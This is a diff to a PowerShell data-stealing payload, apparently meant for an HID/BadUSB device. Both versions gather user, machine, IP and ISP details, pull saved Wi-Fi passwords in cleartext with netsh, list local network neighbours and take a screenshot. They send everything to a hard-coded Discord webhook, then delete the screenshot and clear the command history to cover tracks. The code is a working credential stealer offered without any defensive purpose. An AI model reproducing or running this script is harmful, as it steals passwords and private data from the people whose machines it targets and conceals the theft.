@@ -1,89 +1,43 @@
-# --- CONFIGURATION ---
+# --- CONFIG ---
 $WEBHOOK = "https://discord.com/api/webhooks/1481790664013512774/aFcyihxEknHXmDUtZIOH36pmZQrcBhAbYbH3d8uAHuwpDKOjD7NEtKiS_Wy6FuUTK0dY"
-$SCREENSHOT_PATH = "$env:TEMP\sys_log.png"
+$SCREEN = "$env:TEMP\s.png"
 
-# --- NETWORK INFO ---
-try {
-    $IPInfo = Invoke-RestMethod ipinfo.io/json
-    $PublicIP = $IPInfo.ip
-    $City = $IPInfo.city
-    $ISP = $IPInfo.org
-} catch {
-    $PublicIP = "Unknown"; $City = "Unknown"; $ISP = "Unknown"
-}
-
-# --- HARDWARE & OS ---
+# --- SYSTEM DATA ---
+$User = $env:USERNAME
+$PC = $env:COMPUTERNAME
+try { $IPInfo = Invoke-RestMethod ipinfo.io/json; $PublicIP = $IPInfo.ip; $ISP = $IPInfo.org } catch { $PublicIP = "N/A" }
 $OS = (Get-CimInstance Win32_OperatingSystem).Caption
-$CPU = (Get-CimInstance Win32_Processor).Name
 $RAM = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"
-$Bat = Get-CimInstance -ClassName Win32_Battery -ErrorAction SilentlyContinue
-$BatStatus = if($Bat){ "$($Bat.EstimatedChargeRemaining)% (Battery)" } else { "Desktop / AC Power" }
 
-# --- SECURITY & APPS ---
-$AV = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName
-$TopProcs = (Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -ExpandProperty Name) -join ", "
+# --- WIFI & NET ---
+$WF = netsh wlan show prof | sls ':\s+(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $k=netsh wlan show prof name=$n key=clear | sls 'Key Content\s+:\s+(.+)$' | %{$_.Matches.Groups[1].Value}; "[$n]: $k"} | Out-String
+$AM = arp -a | sls "dynamic" | select -first 5 | Out-String
 
-# --- WIFI EXTRACTION ---
-$WiFiRaw = netsh wlan show prof | Select-String ':\s+(.+)$' | ForEach-Object {
-    $name = $_.Matches.Groups[1].Value.Trim()
-    $pass = netsh wlan show prof name=$name key=clear | Select-String 'Key Content\s+:\s+(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value }
-    if($pass){ "[$name]: $pass" }
-} | Out-String
-
-# --- LOCAL NETWORK MAP ---
-$LocalMapRaw = arp -a | Select-String "dynamic" | Select-Object -First 5 | Out-String
-
-# --- SANITIZE OUTPUT FOR DISCORD ---
-$WiFiClean = "No Keys Found"
-if ($WiFiRaw) { $WiFiClean = $WiFiRaw.Trim() }
-if ($WiFiClean.Length -gt 800) { $WiFiClean = $WiFiClean.Substring(0,800) }
-
-$NetClean = "No Neighbors Found"
-if ($LocalMapRaw) { $NetClean = $LocalMapRaw.Trim() }
-if ($NetClean.Length -gt 500) { $NetClean = $NetClean.Substring(0,500) }
-
-# Wrap in code blocks
-$WiFiFinal = "```" + $WiFiClean + "```"
-$NetFinal = "```" + $NetClean + "```"
+# --- CLEAN STRINGS ---
+$WiFiData = if($WF){ $WF.Trim() } else { "No WiFi Found" }
+$NetData = if($AM){ $AM.Trim() } else { "No Neighbors Found" }
 
 # --- SCREENSHOT ---
 try {
-    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-    $S = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $B = New-Object System.Drawing.Bitmap($S.Width,$S.Height)
-    $G = [System.Drawing.Graphics]::FromImage($B)
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    $S=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $B=New-Object System.Drawing.Bitmap($S.Width,$S.Height)
+    $G=[System.Drawing.Graphics]::FromImage($B)
     $G.CopyFromScreen(0,0,0,0,$B.Size)
-    $B.Save($SCREENSHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Png)
+    $B.Save($SCREEN)
     $G.Dispose(); $B.Dispose()
 } catch {}
 
-# --- STYLED DISCORD EMBED ---
-$Payload = @{
-    embeds = @(@{
-        title = "--- NEXUS ELITE SYSTEM EXTRACTION ---"
-        description = "Advanced system metrics and network mapping completed."
-        color = 2829619
-        footer = @{ text = "Nexus-HID | Protocol 1.2 | $(Get-Date -Format 'HH:mm:ss')" }
-        fields = @(
-            @{ name = "Target Identity"; value = "User: **$env:USERNAME**`nPC: **$env:COMPUTERNAME**`nOS: $OS"; inline = $false }
-            @{ name = "Network Info"; value = "IP: $PublicIP`nCity: $City`nISP: $ISP"; inline = $true }
-            @{ name = "Hardware Stats"; value = "CPU: $CPU`nRAM: $RAM`nPower: $BatStatus"; inline = $true }
-            @{ name = "Security Status"; value = "AV: **$AV**"; inline = $false }
-            @{ name = "Top Processes (CPU)"; value = "``$TopProcs``"; inline = $false }
-            @{ name = "Saved WiFi Networks"; value = $WiFiFinal; inline = $false }
-            @{ name = "Local Network Neighbors"; value = $NetFinal; inline = $false }
-        )
-    })
-}
+# --- EMBED ---
+$Fields = @(
+    @{ name = "Identity"; value = "$User @ $PC"; inline = $true }
+    @{ name = "Network"; value = "$PublicIP ($ISP)"; inline = $true }
+    @{ name = "WiFi Keys"; value = "```$WiFiData```"; inline = $false }
+    @{ name = "Local Map"; value = "```$NetData```"; inline = $false }
+)
 
-$Json = $Payload | ConvertTo-Json -Depth 4
-Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $Json -ContentType 'application/json'
+$Payload = @{ embeds = @(@{ title = "Nexus Elite Extraction"; color = 2829619; fields = $Fields }) }
+Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body ($Payload | ConvertTo-Json -Depth 4) -ContentType 'application/json'
 
-# --- FILE UPLOAD ---
-if (Test-Path $SCREENSHOT_PATH) {
-    curl.exe -F "file=@$SCREENSHOT_PATH" $WEBHOOK
-    Remove-Item $SCREENSHOT_PATH
-}
-
-Clear-History
-exit
+if (Test-Path $SCREEN) { curl.exe -F "file=@$SCREEN" $WEBHOOK; Remove-Item $SCREEN }
+Clear-History; exit
